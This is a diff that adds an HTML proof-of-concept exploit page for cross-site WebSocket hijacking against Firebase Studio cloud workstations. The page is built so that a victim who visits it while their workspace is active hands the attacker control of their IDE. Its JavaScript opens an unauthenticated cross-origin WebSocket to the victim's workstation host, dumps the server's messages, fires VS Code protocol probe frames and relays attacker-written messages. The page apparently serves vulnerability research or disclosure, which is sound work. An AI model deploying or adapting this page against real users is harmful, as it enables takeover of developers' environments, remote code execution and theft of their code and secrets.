@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html>
+<head><title>Firebase Studio CSWSH PoC</title></head>
+<body>
+<h2>Firebase Studio — Cross-Site WebSocket Hijacking → RCE PoC</h2>
+<p>Demonstrates unauthenticated cross-origin WebSocket access to a Firebase Studio workstation.</p>
+<p>Attack scenario: victim visits this page while their workspace is active → attacker gets full IDE control.</p>
+
+<label>Target Workstation Host:</label><br>
+<input type="text" id="host" size="80" placeholder="firebase-XXXX.cluster-YYYY.cloudworkstations.dev" value="">
+<button onclick="testCSWSH()">1. Connect</button>
+<button onclick="probeProtocol()">2. Probe Protocol</button>
+<button onclick="sendCustom()">3. Send Custom</button>
+<br><br>
+<label>Custom message (JSON):</label><br>
+<textarea id="custom" rows="3" cols="80">{"type":"request","seq":1,"command":"initialize"}</textarea>
+<br><br>
+<pre id="log" style="background:#111;color:#0f0;padding:10px;max-height:600px;overflow:auto;font-size:12px;white-space:pre-wrap;"></pre>
+
+<script>
+var ws = null;
+var log = document.getElementById('log');
+var msgCount = 0;
+var allMessages = [];
+
+function l(msg) {
+  var ts = new Date().toISOString().split('T')[1].split('.')[0];
+  log.textContent += '[' + ts + '] ' + msg + '\n';
+  log.scrollTop = log.scrollHeight;
+}
+
+function hexDump(buf, maxLen) {
+  var arr = new Uint8Array(buf.slice(0, maxLen || 64));
+  var hex = '', ascii = '';
+  for (var i = 0; i < arr.length; i++) {
+    hex += arr[i].toString(16).padStart(2, '0') + ' ';
+    ascii += (arr[i] >= 32 && arr[i] < 127) ? String.fromCharCode(arr[i]) : '.';
+  }
+  return hex.trim() + ' | ' + ascii;
+}
+
+function testCSWSH() {
+  var host = document.getElementById('host').value.trim();
+  if (!host) { l('ERROR: Enter workstation hostname'); return; }
+
+  l('=== CSWSH TEST ===');
+  l('[*] Target: ' + host);
+  l('[*] Attacker origin: ' + location.origin);
+  l('[*] This is a CROSS-ORIGIN connection (no cookies, no tokens)');
+  l('');
+
+  var wsUrl = 'wss://' + host + '/?reconnectionToken=poc-' + Date.now() + '&reconnection=false&skipWebSocketFrames=false';
+  l('[*] Connecting: ' + wsUrl.substring(0, 80) + '...');
+
+  try {
+    ws = new WebSocket(wsUrl);
+    ws.binaryType = 'arraybuffer';
+  } catch(e) {
+    l('[!] Constructor error: ' + e.message);
+    return;
+  }
+
+  ws.onopen = function() {
+    l('');
+    l('[+] *** WEBSOCKET CONNECTED FROM CROSS-ORIGIN ***');
+    l('[+] readyState: ' + ws.readyState + ' (OPEN)');
+    l('[+] protocol: ' + (ws.protocol || 'default'));
+    l('[+] CSWSH CONFIRMED — no auth, no origin check');
+    l('');
+    l('[*] Waiting for server messages...');
+  };
+
+  ws.onmessage = function(e) {
+    msgCount++;
+    var info = '[MSG #' + msgCount + '] ';
+
+    if (e.data instanceof ArrayBuffer) {
+      var size = e.data.byteLength;
+      info += 'BINARY (' + size + ' bytes): ';
+      info += hexDump(e.data, 128);
+
+      var view = new Uint8Array(e.data);
+      var firstByte = view[0];
+      l(info);
+      l('    First byte (msg type): 0x' + firstByte.toString(16) + ' (' + firstByte + ')');
+
+      // Try to decode as UTF-8 text after first byte
+      if (size > 1) {
+        try {
+          var textPart = new TextDecoder().decode(e.data.slice(1));
+          if (textPart.length < 2000) {
+            l('    Payload as text: ' + textPart.substring(0, 500));
+          } else {
+            l('    Payload as text (first 500): ' + textPart.substring(0, 500));
+          }
+          // Try JSON parse
+          try {
+            var jsonObj = JSON.parse(textPart);
+            l('    Payload is valid JSON!');
+            l('    Keys: ' + Object.keys(jsonObj).join(', '));
+          } catch(je) {}
+        } catch(de) {}
+      }
+
+      allMessages.push({type: 'binary', size: size, firstByte: firstByte, data: e.data});
+    } else {
+      info += 'TEXT (' + e.data.length + ' chars): ';
+      if (e.data.length > 1000) {
+        info += e.data.substring(0, 1000) + '...';
+      } else {
+        info += e.data;
+      }
+      l(info);
+
+      try {
+        var parsed = JSON.parse(e.data);
+        l('    Valid JSON - type: ' + (parsed.type || 'N/A') + ', keys: ' + Object.keys(parsed).join(', '));
+      } catch(pe) {}
+
+      allMessages.push({type: 'text', data: e.data});
+    }
+  };
+
+  ws.onerror = function(e) {
+    l('[-] WebSocket error');
+  };
+
+  ws.onclose = function(e) {
+    l('[x] Closed: code=' + e.code + ' reason="' + (e.reason || '') + '" clean=' + e.wasClean);
+    l('[*] Total messages received: ' + msgCount);
+  };
+}
+
+function probeProtocol() {
+  if (!ws || ws.readyState !== 1) {
+    l('[-] Not connected');
+    return;
+  }
+  l('');
+  l('=== PROTOCOL PROBE ===');
+
+  // VS Code management connection message types
+  var probes = [
+    // JSON text messages
+    {desc: 'JSON initialize', data: JSON.stringify({type:'request',seq:1,command:'initialize'})},
+    {desc: 'JSON auth empty', data: JSON.stringify({type:'auth',data:''})},
+    {desc: 'JSON sign request', data: JSON.stringify({type:'sign',data:'test'})},
+    {desc: 'JSON tunnel', data: JSON.stringify({type:'tunnel',data:{}})},
+
+    // Binary: VS Code protocol frames (first byte = message type)
+    // Type 0 = Regular, 1 = Control, 2 = Ack, 3 = Disconnect, 4 = ReplayRequest
+    {desc: 'Binary type=0 (Regular) empty', data: new Uint8Array([0]).buffer},
+    {desc: 'Binary type=1 (Control) empty', data: new Uint8Array([1]).buffer},
+    {desc: 'Binary type=3 (KeepAlive)', data: new Uint8Array([3]).buffer},
+
+    // Binary with JSON payload after type byte
+    {desc: 'Binary type=0 + JSON init', data: (function(){
+      var json = JSON.stringify({type:'request',seq:1,command:'initialize'});
+      var buf = new Uint8Array(1 + json.length);
+      buf[0] = 0;
+      for(var i=0;i<json.length;i++) buf[i+1] = json.charCodeAt(i);
+      return buf.buffer;
+    })()},
+  ];
+
+  var delay = 0;
+  probes.forEach(function(probe) {
+    setTimeout(function() {
+      try {
+        if (typeof probe.data === 'string') {
+          ws.send(probe.data);
+          l('[>] Sent: ' + probe.desc + ' (text, ' + probe.data.length + ' chars)');
+        } else {
+          ws.send(probe.data);
+          l('[>] Sent: ' + probe.desc + ' (binary, ' + probe.data.byteLength + ' bytes)');
+        }
+      } catch(ex) {
+        l('[!] Send failed: ' + probe.desc + ' - ' + ex.message);
+      }
+    }, delay);
+    delay += 300;
+  });
+}
+
+function sendCustom() {
+  if (!ws || ws.readyState !== 1) {
+    l('[-] Not connected');
+    return;
+  }
+  var msg = document.getElementById('custom').value;
+  try {
+    ws.send(msg);
+    l('[>] Sent custom: ' + msg.substring(0, 200));
+  } catch(ex) {
+    l('[!] Send error: ' + ex.message);
+  }
+}
+</script>
+</body>
+</html>
